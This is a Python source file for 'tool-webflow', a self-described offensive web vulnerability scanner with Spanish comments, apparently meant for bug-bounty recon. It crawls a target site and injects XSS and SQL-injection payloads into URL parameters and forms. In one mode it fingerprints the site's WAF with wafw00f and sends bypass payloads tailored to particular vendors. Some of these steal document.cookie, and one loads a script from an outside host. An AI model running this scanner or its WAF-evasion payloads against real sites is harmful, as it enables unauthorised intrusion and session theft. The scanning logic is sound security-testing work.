#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""tool-webflow – escáner ofensivo de vulnerabilidades web.

- Descubre URLs internas a partir de una URL inicial.
- Realiza pruebas de XSS y SQLi sobre parámetros.
- Revisa cabeceras de seguridad HTTP.
- Modo --waf-xss: detecta WAF y lanza payloads XSS específicos por WAF.
- Opcionalmente genera salida en JSON.

Pensado para recon / bug bounty como primer filtro rápido.
"""

import argparse
import json
import signal
import subprocess
import sys
from urllib.parse import urljoin, urlparse, parse_qsl, urlencode, urlunparse

import requests
from bs4 import BeautifulSoup
from lxml import html
from termcolor import colored
from tqdm import tqdm


# ─── Configuración global ────────────────────────────────────────────────────

DEFAULT_HEADERS = {
    "User-Agent": "Mozilla/5.0 (compatible; tool-webflow by TheOffSecGirl)",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
}

XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "'><script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
]

SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' OR 1=1-- -",
    "' UNION SELECT NULL-- -",
]

SECURITY_HEADERS = [
    "Content-Security-Policy",
    "X-Frame-Options",
    "X-Content-Type-Options",
    "Referrer-Policy",
    "Strict-Transport-Security",
]

# Payloads WAF-específicos portados de tool-waxss
WAF_XSS_PAYLOADS = {
    "akamai": [
        "';k='e'%0Atop //",
        "'><A HRef=' AutoFocus OnFocus=top//?. >",
    ],
    "cloudflare": [
        "<svg/onload=window>",
        "<Svg Only=1 OnLoad=confirm(document.cookie)>",
    ],
    "cloudfront": [
        "'>'><details/open/ontoggle=confirm('XSS')>",
        "6'%22()%26%25%22%3E%3Csvg/onload=prompt(1)%3E/",
    ],
    "modsecurity": [
        "<svg onload='new Function[\"Y000!\"].find(alert)'>",
    ],
    "imperva": [
        "<Img Src=//X55.is OnLoad%0C=import(Src)>",
        "<details open ontoggle=prompt(document.cookie)>",
    ],
    "sucuri": [
        "'><img src=x onerror=alert(document.cookie)>",
        "<button onClick='prompt(1337)'>Submit</button>",
    ],
}


# ─── Helpers ─────────────────────────────────────────────────────────────────

def signal_handler(sig, frame):
    log_warn("Interrumpido por el usuario.")
    sys.exit(0)


signal.signal(signal.SIGINT, signal_handler)


def log_info(msg: str):
    print(colored(f"[+] {msg}", "green"))


def log_warn(msg: str):
    print(colored(f"[!] {msg}", "yellow"))


def log_error(msg: str):
    print(colored(f"[x] {msg}", "red"))


def normalize_url(base: str) -> str:
    if not base.startswith(("http://", "https://")):
        base = "https://" + base
    return base.rstrip("/")


def same_host(start_url: str, candidate: str) -> bool:
    a = urlparse(start_url)
    b = urlparse(candidate)
    return a.netloc == b.netloc or b.netloc == ""


# ─── Crawling ────────────────────────────────────────────────────────────────

def discover_urls(start_url: str, max_depth: int = 1, timeout: int = 10):
    start_url = normalize_url(start_url)
    seen = set([start_url])
    queue = [(start_url, 0)]
    discovered = []

    session = requests.Session()
    session.headers.update(DEFAULT_HEADERS)

    while queue:
        current, depth = queue.pop(0)
        discovered.append(current)

        if depth >= max_depth:
            continue

        try:
            resp = session.get(current, timeout=timeout, verify=True)
        except requests.RequestException as e:
            log_warn(f"Error al solicitar {current}: {e}")
            continue

        try:
            tree = html.fromstring(resp.text)
        except Exception:
            continue

        for el in tree.xpath("//a[@href]"):
            href = el.get("href")
            if not href:
                continue
            full = urljoin(current, href).split("#", 1)[0]
            if full not in seen and same_host(start_url, full):
                seen.add(full)
                queue.append((full, depth + 1))

    return discovered


# ─── Scanners estándar ───────────────────────────────────────────────────────

def mutate_url_with_payload(url: str, param: str, payload: str):
    parsed = urlparse(url)
    qs = dict(parse_qsl(parsed.query, keep_blank_values=True))
    if param not in qs:
        return None
    qs[param] = payload
    return urlunparse(parsed._replace(query=urlencode(qs, doseq=True)))


def extract_params(url: str):
    return list(dict(parse_qsl(urlparse(url).query, keep_blank_values=True)).keys())


def check_xss(session, url: str, timeout: int):
    params = extract_params(url)
    findings = []
    for p in params:
        for payload in XSS_PAYLOADS:
            mutated = mutate_url_with_payload(url, p, payload)
            if not mutated:
                continue
            try:
                r = session.get(mutated, timeout=timeout, verify=True)
            except requests.RequestException:
                continue
            if payload in r.text:
                log_warn(f"Posible XSS en {url} parámetro '{p}' con payload '{payload}'")
                findings.append({"type": "xss", "url": url, "parameter": p, "payload": payload, "status": r.status_code})
                break
    return findings


def check_sqli(session, url: str, timeout: int):
    params = extract_params(url)
    findings = []
    baseline = None
    try:
        br = session.get(url, timeout=timeout, verify=True)
        baseline = (br.status_code, len(br.text))
    except requests.RequestException:
        pass

    for p in params:
        for payload in SQLI_PAYLOADS:
            mutated = mutate_url_with_payload(url, p, payload)
            if not mutated:
                continue
            try:
                r = session.get(mutated, timeout=timeout, verify=True)
            except requests.RequestException:
                continue
            error_kw = any(e in r.text.lower() for e in ["sql syntax", "mysql", "sql server", "sqlite", "odbc", "oracle"])
            if baseline:
                if r.status_code != baseline[0] or abs(len(r.text) - baseline[1]) > 100 or error_kw:
                    log_warn(f"Posible SQLi en {url} parámetro '{p}' con payload '{payload}' (status {r.status_code})")
                    findings.append({"type": "sqli", "url": url, "parameter": p, "payload": payload, "status": r.status_code})
                    break
            elif error_kw:
                log_warn(f"Posible SQLi en {url} parámetro '{p}' con payload '{payload}' (status {r.status_code})")
                findings.append({"type": "sqli", "url": url, "parameter": p, "payload": payload, "status": r.status_code})
                break
    return findings


def check_headers(session, url: str, timeout: int):
    try:
        r = session.get(url, timeout=timeout, verify=True)
    except requests.RequestException as e:
        log_warn(f"No se pudieron verificar cabeceras en {url}: {e}")
        return []
    missing = [h for h in SECURITY_HEADERS if h not in r.headers]
    if missing:
        log_warn(f"Cabeceras ausentes en {url}: {', '.join(missing)}")
    return [{"type": "missing_header", "url": url, "header": h} for h in missing]


# ─── Modo WAF + XSS avanzado ─────────────────────────────────────────────────

def detect_waf(url: str) -> str | None:
    """Detecta WAF usando wafw00f. Requiere wafw00f instalado."""
    try:
        result = subprocess.run(
            ["wafw00f", url],
            capture_output=True, text=True, timeout=60
        )
        output = result.stdout or ""
        if "is behind" in output:
            waf = output.split("is behind")[-1].strip().splitlines()[0]
            log_warn(f"WAF detectado: {waf}")
            return waf
        log_info("No se detectó WAF reconocible.")
        return None
    except FileNotFoundError:
        log_error("wafw00f no está instalado. Instala con: pip install wafw00f")
        return None
    except Exception as e:
        log_error(f"Error al ejecutar wafw00f: {e}")
        return None


def get_waf_payloads(waf: str | None) -> list:
    """Devuelve payloads XSS según el WAF detectado."""
    base = list(XSS_PAYLOADS)
    if not waf:
        return base
    for key, payloads in WAF_XSS_PAYLOADS.items():
        if key in waf.lower():
            log_info(f"Usando payloads específicos para {key}.")
            return payloads + base
    return base


def extract_forms(url: str, timeout: int = 20) -> list:
    """Extrae formularios HTML de la página objetivo."""
    try:
        r = requests.get(url, headers=DEFAULT_HEADERS, timeout=timeout, verify=True)
        soup = BeautifulSoup(r.text, "html.parser")
        forms = []
        for form in soup.find_all("form"):
            action = urljoin(url, form.get("action") or url)
            method = form.get("method", "get").lower()
            inputs = {}
            for tag in form.find_all(["input", "textarea", "select"]):
                name = tag.get("name")
                if name:
                    inputs[name] = tag.get("type", "text")
            if inputs:
                forms.append({"url": action, "method": method, "inputs": inputs})
        log_info(f"Formularios encontrados: {len(forms)}")
        return forms
    except requests.RequestException as e:
        log_error(f"Error al extraer formularios: {e}")
        return []


def check_waf_xss(url: str, timeout: int) -> list:
    """Detecta WAF y prueba XSS avanzado en formularios y parámetros URL."""
    log_info("Iniciando modo WAF + XSS avanzado...")
    findings = []

    waf = detect_waf(url)
    payloads = get_waf_payloads(waf)

    # Test sobre parámetros URL
    params = extract_params(url)
    if params:
        session = requests.Session()
        session.headers.update(DEFAULT_HEADERS)
        for p in params:
            for payload in payloads:
                mutated = mutate_url_with_payload(url, p, payload)
                if not mutated:
                    continue
                try:
                    r = session.get(mutated, timeout=timeout, verify=True)
                except requests.RequestException:
                    continue
                if payload in r.text:
                    log_warn(f"[WAF-XSS] Posible XSS en '{p}' con payload: {payload[:60]}")
                    findings.append({"type": "waf_xss", "url": url, "parameter": p, "payload": payload, "waf": waf or "none", "status": r.status_code})
                    break

    # Test sobre formularios
    forms = extract_forms(url, timeout=timeout)
    for form in forms:
        form_url = form["url"]
        method = form["method"]
        for input_name in form["inputs"]:
            for payload in payloads:
                data = {input_name: payload}
                try:
                    if method == "post":
                        r = requests.post(form_url, data=data, timeout=timeout, verify=True)
                    else:
                        r = requests.get(form_url, params=data, timeout=timeout, verify=True)
                except requests.RequestException:
                    continue
                if payload in r.text:
                    log_warn(f"[WAF-XSS] Posible XSS en formulario '{form_url}' campo '{input_name}' → {payload[:60]}")
                    findings.append({"type": "waf_xss_form", "url": form_url, "parameter": input_name, "payload": payload, "waf": waf or "none", "status": r.status_code})
                    break

    if not findings:
        log_info("Modo WAF-XSS: no se encontraron hallazgos.")
    return findings


# ─── CLI ─────────────────────────────────────────────────────────────────────

def parse_args():
    parser = argparse.ArgumentParser(
        description="tool-webflow – Escáner ofensivo de vulnerabilidades web."
    )
    parser.add_argument("-u", "--url", required=True, help="URL objetivo (ej: https://example.com)")
    parser.add_argument("-d", "--depth", type=int, default=1, help="Profundidad de crawling (por defecto 1).")
    parser.add_argument("--no-xss", action="store_true", help="No probar XSS básico.")
    parser.add_argument("--no-sqli", action="store_true", help="No probar SQLi.")
    parser.add_argument("--no-headers", action="store_true", help="No comprobar cabeceras de seguridad.")
    parser.add_argument("--waf-xss", action="store_true", help="Activar detección WAF + XSS avanzado con bypass por WAF (requiere wafw00f).")
    parser.add_argument("-t", "--timeout", type=int, default=10, help="Timeout en segundos (por defecto 10).")
    parser.add_argument("--json-output", help="Guardar resultados en JSON.")
    return parser.parse_args()


# ─── Main ────────────────────────────────────────────────────────────────────

def main():
    args = parse_args()
    log_info("tool-webflow – Web scanner by TheOffSecGirl")

    start_url = normalize_url(args.url)
    timeout = args.timeout
    all_findings = []

    if args.waf_xss:
        all_findings.extend(check_waf_xss(start_url, timeout=timeout))
    else:
        log_info(f"Descubriendo URLs a partir de {start_url} (profundidad {args.depth})...")
        urls = discover_urls(start_url, max_depth=args.depth, timeout=timeout)
        log_info(f"URLs descubiertas: {len(urls)}")

        session = requests.Session()
        session.headers.update(DEFAULT_HEADERS)

        for u in tqdm(urls, desc="Escaneando", unit="url"):
            if not args.no_xss:
                all_findings.extend(check_xss(session, u, timeout=timeout))
            if not args.no_sqli:
                all_findings.extend(check_sqli(session, u, timeout=timeout))
            if not args.no_headers:
                all_findings.extend(check_headers(session, u, timeout=timeout))

    log_info(f"Escaneo completado. Hallazgos totales: {len(all_findings)}")
    resumen = {}
    for f in all_findings:
        resumen[f["type"]] = resumen.get(f["type"], 0) + 1
    if resumen:
        log_info("Resumen por tipo:")
        for tipo, count in resumen.items():
            print(f"  - {tipo}: {count}")
    else:
        log_info("Sin hallazgos relevantes con las heurísticas usadas.")

    if args.json_output:
        try:
            with open(args.json_output, "w", encoding="utf-8") as f:
                json.dump(all_findings, f, indent=2, ensure_ascii=False)
            log_info(f"Resultados guardados en {args.json_output}")
        except OSError as e:
            log_error(f"No se pudo escribir el archivo JSON: {e}")


if __name__ == "__main__":
    main()
